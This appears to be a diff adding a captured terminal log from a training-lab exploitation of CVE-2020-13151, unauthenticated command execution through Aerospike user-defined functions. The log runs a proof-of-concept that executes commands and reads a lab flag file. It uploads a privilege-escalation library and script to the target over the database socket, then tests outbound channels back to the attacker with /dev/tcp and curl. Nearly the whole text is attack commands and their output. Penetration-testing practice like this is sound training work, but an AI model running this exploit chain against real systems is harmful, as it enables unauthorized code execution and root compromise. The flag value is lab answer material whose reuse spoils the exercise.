@@ -1,0 +1,48 @@
+# CVE-2020-13151 — unauthenticated command execution via Aerospike UDF
+# Captured 2026-11-22 against 192.168.150.143:3000 (attacker 192.168.45.158)
+
+$ python3 poc_aerospike_rce.py --ahost 192.168.150.143 --cmd 'id; hostname; uname -r; echo ---LOCAL---; cat /home/aero/local.txt 2>/dev/null; echo ---SUDO---; sudo -n -l 2>&1 | head -5'
+
+[+] build: 5.1.0.1
+[+] wrote dummy record test.cve202013151/wblhqohwkzqpgqed
+[+] registered UDF module 'poc'
+[+] executing: id; hostname; uname -r; echo ---LOCAL---; cat /home/aero/local.txt 2>/dev/null; echo ---SUDO---; sudo -n -l 2>&1 | head -5
+
+===== OUTPUT =====
+uid=1000(aero) gid=1000(aero) groups=1000(aero)
+lab-pwk2-student-cl4-143-ubuntu20-aero-242-100
+5.4.0-104-generic
+---LOCAL---
+8d0b2414df3c73b491d05711c000a9d6
+---SUDO---
+sudo: a password is required
+==================
+
+# ---------------------------------------------------------------------------
+# Payload transfer over the Aerospike socket (no egress from the target)
+
+$ AHOST=192.168.150.143 python3 poc_aerospike_upload.py \
+    --local /tmp/screen_poc/libhax.so --remote /tmp/screenroot/libhax.so --mode 755
+
+[+] uploading /tmp/screen_poc/libhax.so (14264 bytes) -> /tmp/screenroot/libhax.so
+    sent 19020 b64 chars
+[+] remote: 190380462e10228d19a9acd956d8c4d789f641cd79ab1d0aa41d6a92b057b775  /tmp/screenroot/libhax.so
+
+$ sha256sum /tmp/screen_poc/libhax.so        # on Kali, for comparison
+190380462e10228d19a9acd956d8c4d789f641cd79ab1d0aa41d6a92b057b775  /tmp/screen_poc/libhax.so
+
+$ AHOST=192.168.150.143 python3 poc_aerospike_upload.py \
+    --local /tmp/screen_poc/rootcmd.sh --remote /tmp/screenroot/rootcmd.sh --mode 755
+
+[+] uploading /tmp/screen_poc/rootcmd.sh (173 bytes) -> /tmp/screenroot/rootcmd.sh
+    sent 232 b64 chars
+[+] remote: 9e026fe67115ec9ad4211ffa3f4c9cb6c25a04f6962b24499c43d2157c9e9cbb  /tmp/screenroot/rootcmd.sh
+
+# ---------------------------------------------------------------------------
+# Egress test — the reason files had to travel this way
+
+$ timeout 5 bash -c "cat < /dev/null > /dev/tcp/192.168.45.158/4444" && echo PORT_4444_OK || echo PORT_4444_BLOCKED
+PORT_4444_BLOCKED
+
+$ curl -s -m 4 -o /dev/null -w '%{http_code}\n' http://192.168.45.158:8000/
+000
